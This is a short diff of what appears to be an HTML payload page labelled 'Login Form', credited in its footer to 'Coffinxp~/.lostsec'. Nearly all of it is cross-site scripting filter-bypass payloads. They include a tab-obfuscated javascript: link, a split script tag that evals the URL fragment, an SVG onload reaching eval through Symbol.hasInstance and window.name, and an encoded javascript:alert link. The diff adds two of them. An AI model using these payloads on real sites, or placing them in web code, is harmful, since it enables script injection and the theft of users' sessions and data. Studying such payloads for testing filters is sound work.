@@ -12,8 +12,10 @@ info:
 <!-- Login Form -->
 <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
 
-<svg onload="{hello:window . name instanceof{[Symbol.hasInstance]:eval}}">
+<scr<script>ipt>eval(location.hash.slice(1))</scr<script>ipt>
 
+<svg onload="{hello:window . name instanceof{[Symbol.hasInstance]:eval}}">
+<a href="%02%02ja%09v%09a%09s%0cc%0crip%26NewLine;t:alert%26lpar;%26%23x000000000000000029;"&gt;
 <!-- Footer with your name -->
 <div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
   Coffinxp~/.lostsec
